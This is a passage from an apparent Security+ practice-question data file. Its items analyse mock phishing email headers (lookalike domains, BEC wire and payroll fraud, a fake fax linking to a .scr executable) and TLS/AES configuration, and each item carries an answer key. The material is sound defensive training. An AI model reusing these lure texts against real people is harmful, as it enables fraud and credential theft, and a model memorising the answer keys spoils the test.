    exhibit: "Return-Path: <careers@talent-acqulsition.com>\nReceived: from smtp.talent-acqulsition.com (smtp.talent-acqulsition.com [203.0.113.55])\n\tby mx.corp.example.com with ESMTP; Mon, 22 Jun 2026 16:40:12 -0400\nFrom: \"Dana Reyes, Senior Recruiter\" <dreyes@talent-acquisition.com>\nReply-To: <careers@talent-acqulsition.com>\nTo: <jchen@corp.example.com>\nMessage-ID: <job4410@talent-acqulsition.com>\nAuthentication-Results: mx.corp.example.com;\n\tspf=pass smtp.mailfrom=talent-acqulsition.com;\n\tdkim=pass header.d=talent-acqulsition.com;\n\tdmarc=pass header.from=talent-acquisition.com;\nSubject: Jordan, your backend experience caught our eye - $185k role\n\n--- BODY ---\nHi Jordan, I saw your work on the payments platform at Example Corp. Review the role and apply:\n<a href='https://talent-acqulsition.com/apply/jchen'>View Position</a>",
    fields: [
      {
        label: "Look carefully: are the From domain and the sending domain the same?",
        hint: "Compare talent-acquisition vs talent-acqulsition character by character.",
        options: ["Yes, identical", "No — From uses 'acquisition', envelope/Reply-To use 'acqulsition' (l for i)", "Yes, only the TLD differs", "Cannot tell"],
        answer: 1,
        explain: "The From shows the real-looking <span class='cy'>talent-acquisition.com</span>, but the envelope, Reply-To, and link use <span class='hl'>talent-acqulsition.com</span> — an L substituted for the i (homoglyph)."
      },
      {
        label: "Why might SPF/DKIM/DMARC all show pass here?",
        hint: "Whose domain are the auth checks validating?",
        options: ["The attacker spoofed the results", "They pass for the attacker's own lookalike domain, not the brand", "The mail server is misconfigured", "DMARC is disabled"],
        answer: 1,
        explain: "Auth <span class='ok'>passes</span> for the attacker-owned <span class='hl'>talent-acqulsition.com</span> because they legitimately control it. Passing auth on a lookalike domain does not make the mail safe."
      },
      {
        label: "The email addresses the recipient by name and cites their specific project. This indicates:",
        hint: "Personalization level raises the targeting tier.",
        options: ["Generic phishing", "Spear phishing (targeted, personalized)", "Whaling", "Pharming"],
        answer: 1,
        explain: "Use of the target's name, role, and a real project (\"payments platform\") makes this <span class='warnc'>spear phishing</span> — tailored to a specific individual."
      },
      {
        label: "The link href talent-acqulsition.com confirms:",
        hint: "Match the link domain to the auth/envelope domain.",
        options: ["A legitimate careers site", "The same lookalike domain as the envelope — malicious", "An internal job board", "A safe redirect"],
        answer: 1,
        explain: "The href uses the <span class='hl'>lookalike</span> domain, consistent with the spoofed envelope — a malicious destination."
      }
    ],
    summary: "Spear-phishing recruiter lure: auth passes only because it is sent from an attacker-owned homoglyph lookalike (acqulsition vs acquisition)."
  },
  {
    id: "PBQ-082",
    format: 3,
    domain: 2,
    title: "Internal IT Mailbox Full",
    brief: "An \"IT Helpdesk\" message warns the mailbox is over quota and will be disabled. Investigate the headers.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <helpdesk@corp-example-it.com>\nReceived: from mailer.corp-example-it.com (mailer.corp-example-it.com [217.160.0.201])\n\tby mx.corp.example.com with ESMTP; Tue, 23 Jun 2026 06:30:44 -0400\nFrom: \"IT Helpdesk\" <helpdesk@corp.example.com>\nReply-To: <helpdesk@corp-example-it.com>\nTo: <staff@corp.example.com>\nMessage-ID: <quota12@corp-example-it.com>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail smtp.mailfrom=corp-example-it.com;\n\tdkim=none;\n\tdmarc=fail action=reject header.from=corp.example.com\nSubject: [ACTION REQUIRED] Mailbox 98% full - revalidate within 2 hours\n\n--- BODY ---\nYour mailbox has reached its limit. Re-validate now to avoid losing access:\n<a href='https://corp-example-it.com/owa/reauth'>Increase Mailbox Quota</a>",
    fields: [
      {
        label: "DMARC result and requested action",
        hint: "Read dmarc= and action=.",
        options: ["dmarc=pass", "dmarc=fail action=reject", "dmarc=fail action=none", "dmarc=quarantine only"],
        answer: 1,
        explain: "<span class='hl'>dmarc=fail action=reject</span> — corp.example.com's policy says reject mail failing alignment, exactly this message."
      },
      {
        label: "How does the look-alike domain mimic the real company domain?",
        hint: "Compare corp.example.com to corp-example-it.com.",
        options: ["Adds a number", "Rearranges the real domain words with hyphens plus '-it'", "Uses a Cyrillic letter", "Changes the TLD to .org"],
        answer: 1,
        explain: "<span class='hl'>corp-example-it.com</span> flattens the real <span class='ok'>corp.example.com</span> into a hyphenated combination plus '-it' to look like an internal IT domain."
      },
      {
        label: "What social-engineering principle does \"within 2 hours\" exploit?",
        hint: "Time pressure pushes hasty action.",
        options: ["Authority", "Scarcity/urgency", "Social proof", "Familiarity"],
        answer: 1,
        explain: "A short deadline creates <span class='warnc'>urgency</span> (scarcity of time), pressuring the user to act before thinking."
      },
      {
        label: "Best classification",
        hint: "Impersonates internal IT to all staff.",
        options: ["Whaling", "Phishing", "BEC", "Vishing"],
        answer: 1,
        explain: "A broadcast IT-impersonation quota lure to staff is <span class='warnc'>phishing</span>; it is not directed at executives (whaling) or a fraudulent-transfer request (BEC)."
      }
    ],
    summary: "IT \"mailbox full\" phishing spoofing the internal domain (dmarc=fail action=reject) from a hyphenated lookalike, using urgency to drive a fake OWA reauth."
  },
  {
    id: "PBQ-083",
    format: 3,
    domain: 2,
    title: "Fax Notification PDF",
    brief: "An \"incoming fax\" email with a download link arrives. Determine its authenticity.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <fax@efax-delivery.online>\nReceived: from gw.efax-delivery.online (gw.efax-delivery.online [188.166.23.9])\n\tby mx.corp.example.com with ESMTP; Wed, 24 Jun 2026 10:11:55 -0400\nReceived: from compromised-cpe.isp.net (dynamic-198-7-12-44.isp.net [198.7.12.44])\n\tby gw.efax-delivery.online; Wed, 24 Jun 2026 14:11:50 +0000\nFrom: \"eFax Corporate\" <message@efax.com>\nReply-To: <fax@efax-delivery.online>\nTo: <bnguyen@corp.example.com>\nMessage-ID: <fx7781@efax-delivery.online>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail smtp.mailfrom=efax-delivery.online;\n\tdkim=none;\n\tdmarc=none header.from=efax.com\nSubject: You have received a 3-page fax from (415) 555-0193\n\n--- BODY ---\nA new fax document is ready for download.\n<a href='http://efax-delivery.online/fax/download.scr'>Download Fax (3 pages, PDF)</a>",
    fields: [
      {
        label: "Why is dmarc=none significant for efax.com?",
        hint: "Consider what 'none' implies about the brand's published policy.",
        options: ["The brand strongly rejects spoofing", "The brand has no/weak DMARC policy, so spoofing is not blocked by DMARC", "DMARC passed", "DKIM compensated"],
        answer: 1,
        explain: "<span class='warnc'>dmarc=none</span> means no enforcing policy is found, so receivers get no DMARC-based protection — but SPF still <span class='hl'>fails</span>, flagging the forgery."
      },
      {
        label: "The download link extension is .scr. This is concerning because:",
        hint: "Think about what .scr actually is on Windows.",
        options: ["It is a safe PDF", "It is a Windows screensaver/executable disguised as a document", "It is a CSV file", "It is an image"],
        answer: 1,
        explain: "<span class='hl'>.scr</span> is an executable (Windows screensaver) masquerading as a fax PDF — a malware-delivery anchor."
      },
      {
        label: "The second Received hop reveals the true origin as:",
        hint: "Read the earliest hop.",
        options: ["An efax.com data center", "A compromised residential ISP host (198.7.12.44)", "mx.corp.example.com", "A Google relay"],
        answer: 1,
        explain: "The earliest hop is <span class='cy'>compromised-cpe.isp.net [198.7.12.44]</span> — a hijacked dynamic-IP host, not corporate fax infrastructure."
      },
      {
        label: "Classification",
        hint: "Malware delivered via brand-impersonation email.",
        options: ["Phishing (malware delivery)", "Whaling", "Pharming", "Watering-hole"],
        answer: 0,
        explain: "A spoofed fax notification delivering an executable is malware-distribution <span class='warnc'>phishing</span>."
      }
    ],
    summary: "Fax-notification phishing: spf=fail, dmarc=none (no brand protection), origin is a compromised ISP host, and the link drops a disguised .scr executable."
  },
  {
    id: "PBQ-084",
    format: 3,
    domain: 2,
    title: "CEO Wire Transfer Request (BEC)",
    brief: "The AP clerk receives an urgent payment request appearing to be from the CEO. Examine the headers.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <ceo@corp-example.co>\nReceived: from mail.corp-example.co (mail.corp-example.co [162.241.85.110])\n\tby mx.corp.example.com with ESMTP; Thu, 25 Jun 2026 09:55:02 -0400\nFrom: \"Patricia Olsen (CEO)\" <polsen@corp.example.com>\nReply-To: <ceo@corp-example.co>\nTo: <ap-clerk@corp.example.com>\nMessage-ID: <wire330@corp-example.co>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail smtp.mailfrom=corp-example.co;\n\tdkim=none;\n\tdmarc=fail action=quarantine header.from=corp.example.com\nSubject: Re: confidential - need a vendor payment processed today\n\n--- BODY ---\nI am tied up in board meetings. Please wire $48,750 to the new vendor account below before 3pm. Keep this between us - I will sign off afterward. Account details attached.",
    fields: [
      {
        label: "What is the look-alike technique in the sending domain?",
        hint: "Compare corp.example.com to corp-example.co.",
        options: ["Added subdomain", "Hyphenation plus a truncated TLD (.co vs .com)", "Digit substitution", "Unicode homoglyph"],
        answer: 1,
        explain: "<span class='hl'>corp-example.co</span> hyphenates the name and drops to the <span class='hl'>.co</span> TLD — a common doppelganger of the real <span class='ok'>corp.example.com</span>."
      },
      {
        label: "Note there is no link or login page. The core ask is to:",
        hint: "What action does the body request?",
        options: ["Reset a password", "Wire money to a new account urgently and secretly", "Open an attachment for fun", "Confirm a subscription"],
        answer: 1,
        explain: "The message requests a <span class='hl'>fraudulent wire transfer</span> under secrecy and time pressure — the hallmark of financial fraud, not credential theft."
      },
      {
        label: "Which classification fits best?",
        hint: "Executive impersonation targeting finance for a payment.",
        options: ["Generic phishing", "Business Email Compromise (BEC)", "Pharming", "Smishing"],
        answer: 1,
        explain: "Impersonating the CEO to induce a wire transfer is <span class='warnc'>Business Email Compromise (BEC)</span> — a payment-fraud variant of spear phishing with no malicious link needed."
      },
      {
        label: "Which social-engineering principles are most heavily leveraged?",
        hint: "Who is asking, and how fast?",
        options: ["Reciprocity and liking", "Authority and urgency (plus secrecy)", "Social proof", "Scarcity of goods"],
        answer: 1,
        explain: "It exploits <span class='warnc'>authority</span> (the CEO), <span class='warnc'>urgency</span> (\"before 3pm\"), and confidentiality to discourage verification."
      }
    ],
    summary: "Classic BEC: CEO-impersonation wire-fraud request from a .co doppelganger domain (spf=fail/dmarc=fail), no link — authority plus urgency plus secrecy."
  },
  {
    id: "PBQ-085",
    format: 3,
    domain: 2,
    title: "Package Delivery Failure",
    brief: "A shipping carrier \"delivery failed, reschedule\" email arrives during the holiday season. Analyze it.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <track@fedex-reschedule.info>\nReceived: from edge2.fedex-reschedule.info (edge2.fedex-reschedule.info [5.188.206.18])\n\tby mx.corp.example.com with ESMTP; Fri, 26 Jun 2026 12:14:40 -0400\nFrom: \"FedEx Tracking\" <tracking@fedex.com>\nReply-To: <track@fedex-reschedule.info>\nTo: <opatel@corp.example.com>\nMessage-ID: <dl9911@fedex-reschedule.info>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail smtp.mailfrom=fedex-reschedule.info;\n\tdkim=fail header.d=fedex.com;\n\tdmarc=fail action=reject header.from=fedex.com\nSubject: Delivery attempt failed - $2.99 redelivery fee required\n\n--- BODY ---\nWe could not deliver your package. Pay a small redelivery fee to reschedule:\n<a href='http://fedex-reschedule.info/pay?ref=9911'>Reschedule Delivery</a>",
    fields: [
      {
        label: "Identify the look-alike domain",
        hint: "Compare to fedex.com.",
        options: ["fedex.com", "fedex-reschedule.info", "corp.example.com", "mx.corp.example.com"],
        answer: 1,
        explain: "<span class='hl'>fedex-reschedule.info</span> appends a plausible word and uses the cheap <span class='hl'>.info</span> TLD to imitate FedEx."
      },
      {
        label: "All three authentication checks here are:",
        hint: "Read spf, dkim, dmarc.",
        options: ["All pass", "All fail", "Mixed pass/fail", "Not evaluated"],
        answer: 1,
        explain: "<span class='hl'>spf=fail</span>, <span class='hl'>dkim=fail</span>, and <span class='hl'>dmarc=fail action=reject</span> — comprehensive authentication failure."
      },
      {
        label: "The small \"$2.99 fee\" is a tactic to:",
        hint: "Why ask for a tiny amount?",
        options: ["Recover real shipping costs", "Capture payment-card data via a believable small charge", "Donate to charity", "Verify the address only"],
        answer: 1,
        explain: "A trivial <span class='warnc'>fee</span> lowers suspicion while the real goal is harvesting <span class='hl'>card details</span> on the fake payment page."
      },
      {
        label: "Classification",
        hint: "Mass carrier-impersonation, card-harvesting.",
        options: ["Phishing", "Whaling", "BEC", "Pharming"],
        answer: 0,
        explain: "An untargeted carrier-impersonation payment lure is <span class='warnc'>phishing</span>."
      }
    ],
    summary: "Package-delivery phishing with full SPF/DKIM/DMARC failure from a .info lookalike; a token redelivery fee fronts card-data theft."
  },
  {
    id: "PBQ-086",
    format: 3,
    domain: 2,
    title: "Payroll Direct-Deposit Change",
    brief: "HR receives a request to update an employee's direct-deposit account. Scrutinize the headers.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <kwright@gmaiI.com>\nReceived: from mail-sor-f41.google.com (mail-sor-f41.google.com [209.85.220.41])\n\tby mx.corp.example.com with ESMTP; Mon, 22 Jun 2026 13:09:27 -0400\nFrom: \"Kevin Wright\" <kwright@corp.example.com>\nReply-To: <kwright@gmaiI.com>\nTo: <hr-payroll@corp.example.com>\nMessage-ID: <pay551@mail.gmail.com>\nAuthentication-Results: mx.corp.example.com;\n\tspf=pass smtp.mailfrom=gmaiI.com;\n\tdkim=pass header.d=gmaiI.com;\n\tdmarc=fail header.from=corp.example.com\nSubject: Updated bank details for my paycheck\n\n--- BODY ---\nHi, I switched banks. Please update my direct deposit to the new routing/account number below effective this pay period. Thanks, Kevin",
    fields: [
      {
        label: "Examine the Reply-To/Return-Path domain gmaiI.com closely. What is wrong?",
        hint: "Look at the character after 'gma'.",
        options: ["Nothing, it is real gmail.com", "A capital I replaces the lowercase l (gmaiI vs gmail)", "It is missing the .com", "It uses a subdomain"],
        answer: 1,
        explain: "<span class='hl'>gmaiI.com</span> uses a capital <span class='hl'>I</span> in place of the lowercase L — a homoglyph that reads as 'gmail' but is a different domain the attacker controls."
      },
      {
        label: "Why does DMARC fail despite spf=pass and dkim=pass?",
        hint: "Alignment with header.from.",
        options: ["The keys are revoked", "Auth passed for gmaiI.com but header.from is corp.example.com — no alignment", "Google blocked it", "The clock is wrong"],
        answer: 1,
        explain: "SPF/DKIM authenticate the lookalike <span class='cy'>gmaiI.com</span>, but the displayed From is <span class='hl'>corp.example.com</span>; with no alignment, <span class='hl'>dmarc=fail</span>."
      },
      {
        label: "The request to change direct-deposit banking is characteristic of:",
        hint: "Targeted financial-fraud via email impersonation.",
        options: ["Generic phishing", "Payroll-diversion BEC (spear-phishing variant)", "Pharming", "Watering-hole"],
        answer: 1,
        explain: "Impersonating an employee to redirect their pay is <span class='warnc'>payroll-diversion BEC</span> — a targeted business-email-compromise tactic."
      },
      {
        label: "The correct HR response is to:",
        hint: "How do you defeat an impersonation request?",
        options: ["Update the account as asked", "Verify out-of-band via a known phone number before any change", "Reply to confirm via email", "Forward to all staff"],
        answer: 1,
        explain: "<span class='ok'>Out-of-band verification</span> through a trusted channel defeats the impersonation; never act on the email's own reply path."
      }
    ],
    summary: "Payroll-diversion BEC: employee impersonation with a gmaiI.com (capital-I homoglyph) Reply-To; auth passes for the lookalike but dmarc fails alignment."
  },
  {
    id: "PBQ-087",
    format: 3,
    domain: 2,
    title: "Password Expiration Notice",
    brief: "A \"your password expires today\" message points to a portal to reset credentials. Analyze the headers.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <noreply@accounts-secure-login.com>\nReceived: from vps44.accounts-secure-login.com (vps44.accounts-secure-login.com [167.99.81.6])\n\tby mx.corp.example.com with ESMTP; Tue, 23 Jun 2026 05:22:14 -0400\nFrom: \"Account Security\" <noreply@microsoft.com>\nReply-To: <noreply@accounts-secure-login.com>\nTo: <lmorgan@corp.example.com>\nMessage-ID: <pw7720@accounts-secure-login.com>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail smtp.mailfrom=accounts-secure-login.com;\n\tdkim=none;\n\tdmarc=fail action=reject header.from=microsoft.com\nSubject: Your password expires today - keep your current password\n\n--- BODY ---\nYour Microsoft 365 password is set to expire. To keep your current password, verify your identity:\n<a href='https://accounts-secure-login.com/o365/keep'>Keep My Password</a>",
    fields: [
      {
        label: "SPF/DKIM/DMARC summary",
        hint: "Read the three tokens.",
        options: ["All pass", "spf=fail, dkim=none, dmarc=fail (reject)", "spf=pass, dkim=pass, dmarc=pass", "Only DMARC failed"],
        answer: 1,
        explain: "<span class='hl'>spf=fail</span>, <span class='hl'>dkim=none</span>, and <span class='hl'>dmarc=fail action=reject</span> against header.from=microsoft.com — Microsoft's strict policy flags this clearly."
      },
      {
        label: "What clever twist does \"keep your current password\" use?",
        hint: "Most lures say 'reset'; this says 'keep'.",
        options: ["It is harmless", "It lowers the victim's guard while still capturing the current password", "It bypasses MFA automatically", "It is a legitimate Microsoft feature"],
        answer: 1,
        explain: "Framing it as <span class='warnc'>keeping</span> the password makes the victim feel they avoid change, yet they still type their <span class='hl'>real credentials</span> into the fake page."
      },
      {
        label: "The link domain accounts-secure-login.com is:",
        hint: "Is this a Microsoft domain?",
        options: ["A genuine Microsoft login domain", "An attacker-controlled credential-harvest domain", "An internal corp domain", "A safe CDN"],
        answer: 1,
        explain: "It is a generic <span class='hl'>attacker domain</span> with no relation to microsoft.com, hosting an O365 credential-capture page."
      },
      {
        label: "Classification",
        hint: "Mass brand impersonation harvesting logins.",
        options: ["Phishing", "Whaling", "BEC", "Vishing"],
        answer: 0,
        explain: "A broadcast Microsoft-impersonation credential lure is <span class='warnc'>phishing</span>."
      }
    ],
    summary: "Password-expiration phishing impersonating Microsoft (spf=fail/dkim=none/dmarc=reject); the 'keep your password' framing still harvests real O365 credentials."
  },
  {
    id: "PBQ-088",
    format: 3,
    domain: 2,
    title: "Charity Donation Appeal",
    brief: "A disaster-relief donation request arrives from a vaguely familiar charity. Evaluate the headers.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <donate@redcross-relieffund.org>\nReceived: from bulk.redcross-relieffund.org (bulk.redcross-relieffund.org [185.53.178.9])\n\tby mx.corp.example.com with ESMTP; Wed, 24 Jun 2026 15:48:31 -0400\nFrom: \"American Red Cross\" <donations@redcross.org>\nReply-To: <donate@redcross-relieffund.org>\nTo: <undisclosed-recipients:;>\nMessage-ID: <chr882@redcross-relieffund.org>\nAuthentication-Results: mx.corp.example.com;\n\tspf=softfail smtp.mailfrom=redcross-relieffund.org;\n\tdkim=none;\n\tdmarc=fail header.from=redcross.org\nSubject: Urgent: families displaced - donate before midnight to double your impact\n\n--- BODY ---\nHelp families affected by the recent floods. Every dollar is matched tonight only:\n<a href='http://redcross-relieffund.org/give'>Donate Now</a>",
    fields: [
      {
        label: "The To header 'undisclosed-recipients:;' suggests:",
        hint: "What does a hidden recipient list imply?",
        options: ["A personalized, targeted email", "A mass BCC blast to many addresses", "An internal-only memo", "A reply to the user"],
        answer: 1,
        explain: "<span class='cy'>undisclosed-recipients:;</span> means the message was BCC-blasted to many people — a hallmark of <span class='warnc'>mass</span> phishing, not targeting."
      },
      {
        label: "DMARC and SPF combined",
        hint: "Read both tokens.",
        options: ["Both pass", "spf=softfail and dmarc=fail", "Both neutral", "dmarc=pass"],
        answer: 1,
        explain: "<span class='warnc'>spf=softfail</span> plus <span class='hl'>dmarc=fail</span> on header.from=redcross.org show the brand is being spoofed."
      },
      {
        label: "\"Matched tonight only\" exploits which principle?",
        hint: "Limited-time matching offer.",
        options: ["Authority", "Scarcity/urgency", "Reciprocity", "Consensus"],
        answer: 1,
        explain: "A midnight deadline with doubled impact manufactures <span class='warnc'>scarcity and urgency</span> to rush the donation."
      },
      {
        label: "Classification",
        hint: "Untargeted charity-impersonation money lure.",
        options: ["Phishing", "Spear phishing", "Whaling", "Pharming"],
        answer: 0,
        explain: "A mass charity-impersonation appeal to extract money/payment data is <span class='warnc'>phishing</span>."
      }
    ],
    summary: "Charity-impersonation phishing: BCC mass-blast (undisclosed-recipients), spf=softfail/dmarc=fail on redcross.org, urgency-driven donation to a lookalike domain."
  },
  {
    id: "PBQ-089",
    format: 3,
    domain: 2,
    title: "Shared Calendar Invite",
    brief: "A meeting invitation with a join link arrives, supposedly from a colleague. Analyze the headers.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <invite@teams-meet-secure.com>\nReceived: from relay.teams-meet-secure.com (relay.teams-meet-secure.com [45.61.136.7])\n\tby mx.corp.example.com with ESMTP; Thu, 25 Jun 2026 08:40:09 -0400\nFrom: \"Microsoft Teams\" <noreply@teams.microsoft.com>\nReply-To: <invite@teams-meet-secure.com>\nTo: <sosei@corp.example.com>\nMessage-ID: <mt4419@teams-meet-secure.com>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail smtp.mailfrom=teams-meet-secure.com;\n\tdkim=none;\n\tdmarc=fail action=quarantine header.from=teams.microsoft.com\nSubject: Meeting invite: \"Q3 Planning\" - join now, in progress\n\n--- BODY ---\nYour meeting is in progress. Join the call:\n<a href='https://teams-meet-secure.com/join?id=4419'>Join Microsoft Teams Meeting</a>",
    fields: [
      {
        label: "Identify the look-alike domain",
        hint: "Compare to teams.microsoft.com.",
        options: ["teams.microsoft.com", "teams-meet-secure.com", "corp.example.com", "mx.corp.example.com"],
        answer: 1,
        explain: "<span class='hl'>teams-meet-secure.com</span> borrows the 'teams' keyword with reassuring words ('meet','secure') but is unrelated to Microsoft."
      },
      {
        label: "SPF and DMARC results",
        hint: "Read both tokens.",
        options: ["spf=pass, dmarc=pass", "spf=fail, dmarc=fail (quarantine)", "spf=neutral, dmarc=none", "spf=softfail, dmarc=pass"],
        answer: 1,
        explain: "<span class='hl'>spf=fail</span> and <span class='hl'>dmarc=fail action=quarantine</span> on header.from=teams.microsoft.com expose the spoof."
      },
      {
        label: "\"In progress / join now\" is designed to:",
        hint: "Why claim the meeting already started?",
        options: ["Be informative", "Create urgency so the victim clicks without scrutiny", "Comply with policy", "Reduce noise"],
        answer: 1,
        explain: "Claiming the meeting is live manufactures <span class='warnc'>urgency</span>, pushing a fast, unverified click."
      },
      {
        label: "Classification",
        hint: "Brand-impersonation credential lure via fake join page.",
        options: ["Phishing", "Whaling", "BEC", "Smishing"],
        answer: 0,
        explain: "A spoofed Teams invite driving to a fake join/login page is <span class='warnc'>phishing</span>."
      }
    ],
    summary: "Fake Teams meeting invite (spf=fail/dmarc=quarantine) from a 'teams-meet-secure' lookalike, using a live-meeting pretext to force a hasty click."
  },
  {
    id: "PBQ-090",
    format: 3,
    domain: 2,
    title: "Quarantined Email Release",
    brief: "A \"messages held in quarantine\" digest asks the user to log in to release email. Examine the headers.",
    exhibitTitle: "message headers",
    exhibit: "Return-Path: <quarantine@mail-security-gateway.net>\nReceived: from filter.mail-security-gateway.net (filter.mail-security-gateway.net [193.56.29.144])\n\tby mx.corp.example.com with ESMTP; Fri, 26 Jun 2026 06:58:47 -0400\nFrom: \"Mail Quarantine\" <quarantine@corp.example.com>\nReply-To: <quarantine@mail-security-gateway.net>\nTo: <tobrien@corp.example.com>\nMessage-ID: <qz6610@mail-security-gateway.net>\nAuthentication-Results: mx.corp.example.com;\n\tspf=fail smtp.mailfrom=mail-security-gateway.net;\n\tdkim=none;\n\tdmarc=fail action=reject header.from=corp.example.com\nSubject: You have 3 messages held in quarantine - review and release\n\n--- BODY ---\nThe following messages were quarantined. Log in to release legitimate mail:\n<a href='https://mail-security-gateway.net/release?u=tobrien'>Review &amp; Release Messages</a>",
    fields: [
      {
        label: "DMARC result against the internal domain",
        hint: "Read dmarc= and action=.",
        options: ["dmarc=pass", "dmarc=fail action=reject", "dmarc=none", "dmarc=fail action=none"],
        answer: 1,
        explain: "<span class='hl'>dmarc=fail action=reject</span> on header.from=corp.example.com — the impersonated internal domain enforces reject."
      },
      {
        label: "Is the From spoofing the recipient's own organization?",
        hint: "Compare the From domain to the recipient and the actual sender.",
        options: ["No, it is a third-party vendor", "Yes — From shows corp.example.com but it was sent from an external gateway domain", "Only the display name is spoofed", "It is internal and legitimate"],
        answer: 1,
        explain: "The From spoofs <span class='hl'>quarantine@corp.example.com</span>, yet the Return-Path, Reply-To, and Received hop are all the external <span class='hl'>mail-security-gateway.net</span>."
      },
      {
        label: "Why is a quarantine-release lure psychologically effective?",
        hint: "It mimics a security tool users already trust.",
        options: ["It offers money", "It impersonates a trusted security service, exploiting familiarity/authority", "It is funny", "It promises a prize"],
        answer: 1,
        explain: "Posing as the security gateway exploits <span class='warnc'>trust/authority</span> in routine IT tooling, so users log in to \"release\" mail."
      },
      {
        label: "Classification",
        hint: "Mass impersonation of a security service to harvest logins.",
        options: ["Phishing", "Whaling", "Pharming", "BEC"],
        answer: 0,
        explain: "A broadcast security-service-impersonation credential lure is <span class='warnc'>phishing</span>."
      }
    ],
    summary: "Quarantine-release phishing spoofing the internal domain (dmarc=fail action=reject) from an external gateway lookalike, abusing trust in security tooling to harvest logins."
  }
);
SECPLUS.pbqs.push(
  {
    id: "PBQ-091",
    format: 4,
    domain: 1,
    title: "Distributed Database Data-at-Rest Encryption",
    brief: "A fintech firm must encrypt customer PII stored across a sharded PostgreSQL cluster. The control must protect specific sensitive columns and provide both confidentiality and integrity for each encrypted value.",
    exhibitTitle: "requirements.txt",
    exhibit: "[ DATA-AT-REST ENCRYPTION SPEC ]\nScope ........ <span class='cy'>customer.ssn, customer.dob, payment.pan</span>\nThreat ....... stolen disk / DB dump exfiltration\nGranularity .. column-level (NOT whole disk)\nProperty ..... confidentiality <span class='ok'>AND</span> built-in integrity tag\nCompliance ... PCI DSS 4.0, FIPS 140-3 module\n<span class='warnc'>NOTE: legacy build used AES-128-ECB -- flagged by auditor</span>\n<span class='dim'>keys delivered from external KMS, rotated annually</span>",
    fields: [
      {
        label: "Symmetric algorithm + key length",
        hint: "FIPS-approved, strongest practical key size",
        options: ["AES-256", "AES-128", "3DES (168-bit)", "Blowfish-128"],
        answer: 0,
        explain: "AES-256 is the FIPS-approved block cipher with the largest standard key size, giving the widest security margin for long-lived PII. 3DES is deprecated (SWEET32, retired by NIST) and Blowfish is not FIPS-approved."
      },
      {
        label: "Cipher mode of operation",
        hint: "Provides an authentication tag, not just confidentiality",
        options: ["GCM (Galois/Counter Mode)", "CBC (Cipher Block Chaining)", "ECB (Electronic Codebook)", "CTR (Counter)"],
        answer: 0,
        explain: "GCM is an AEAD mode that produces an authentication tag alongside ciphertext, satisfying the 'confidentiality AND integrity' requirement in one operation. CBC and CTR provide confidentiality only; ECB leaks plaintext patterns and must never be used."
      },
      {
        label: "Encryption granularity",
        hint: "Match the Scope line in the spec",
        options: ["Column/field-level encryption", "Full-disk encryption (FDE)", "Transparent Data Encryption of the whole instance", "File-system volume encryption"],
        answer: 0,
        explain: "Only the named sensitive columns are in scope, so column/field-level encryption applies crypto precisely to ssn, dob, and pan. FDE/volume encryption protects against a stolen physical disk but does nothing against an authenticated DB dump."
      },
      {
        label: "What is WRONG in the legacy build?",
        hint: "Read the NOTE line",
        options: ["AES-128-ECB leaks patterns and lacks integrity", "AES-128 keys are too short to be legal", "ECB is fine but the key rotation is too slow", "Nothing -- AES-128-ECB meets PCI DSS"],
        answer: 0,
        explain: "ECB encrypts identical plaintext blocks to identical ciphertext, exposing structure (the classic 'ECB penguin'), and provides no integrity. The key-length is acceptable; the mode is the defect."
      }
    ],
    summary: "Column-level AES-256-GCM gives FIPS-approved confidentiality plus an integrity tag for targeted PII; ECB is never acceptable."
  },
  {
    id: "PBQ-092",
    format: 4,
    domain: 1,
    title: "TLS 1.3 Termination for a Public API Gateway",
    brief: "Harden the public HTTPS endpoint of an API gateway. Legacy protocol versions and ciphers must be removed, and the browser must be told never to connect over plaintext again.",
    exhibitTitle: "gateway-tls.conf",
    exhibit: "[ INBOUND TLS POLICY ]\nmin_protocol = <span class='ok'>TLS 1.3</span>\ndisabled .... <span class='hl'>SSLv3, TLS 1.0, TLS 1.1</span>\nciphers ..... AEAD only, PFS required\nhsts ........ <span class='cy'>max-age=63072000; includeSubDomains; preload</span>\n<span class='warnc'>legacy vhost still negotiates TLS_RSA_WITH_AES_128_CBC_SHA -- remove</span>\n<span class='dim'>OCSP stapling enabled</span>",
    fields: [
      {
        label: "Minimum protocol version to enforce",
        hint: "Latest standardized TLS, removes static RSA & CBC",
        options: ["TLS 1.3", "TLS 1.2", "TLS 1.1", "TLS 1.0"],
        answer: 0,
        explain: "TLS 1.3 removes all legacy key-exchange and CBC-mode suites, mandates forward secrecy, and is the current best-practice floor. TLS 1.0/1.1 are deprecated (RFC 8996)."
      },
      {
        label: "Cipher suite to allow",
        hint: "AEAD construction with ephemeral key exchange",
        options: ["TLS_AES_256_GCM_SHA384", "TLS_RSA_WITH_AES_128_CBC_SHA", "TLS_RSA_WITH_RC4_128_MD5", "TLS_RSA_WITH_3DES_EDE_CBC_SHA"],
        answer: 0,
        explain: "TLS_AES_256_GCM_SHA384 is a TLS 1.3 AEAD suite using ephemeral key exchange (forward secrecy). The RSA/CBC, RC4, and 3DES suites are all deprecated and offer no forward secrecy."
      },
      {
        label: "Response header that forces HTTPS",
        hint: "max-age line in the config",
        options: ["Strict-Transport-Security (HSTS)", "X-Frame-Options", "Content-Security-Policy", "X-XSS-Protection"],
        answer: 0,
        explain: "HSTS (Strict-Transport-Security) tells browsers to use HTTPS exclusively for the domain for the max-age window, defeating SSL-strip downgrade attacks. The other headers address framing and content injection, not transport downgrade."
      },
      {
        label: "Which legacy suite must be removed?",
        hint: "Read the warning line",
        options: ["TLS_RSA_WITH_AES_128_CBC_SHA -- no PFS, CBC, SHA-1", "TLS_AES_128_GCM_SHA256 -- it is too new", "TLS_CHACHA20_POLY1305_SHA256 -- not AEAD", "None -- the legacy vhost is already safe"],
        answer: 0,
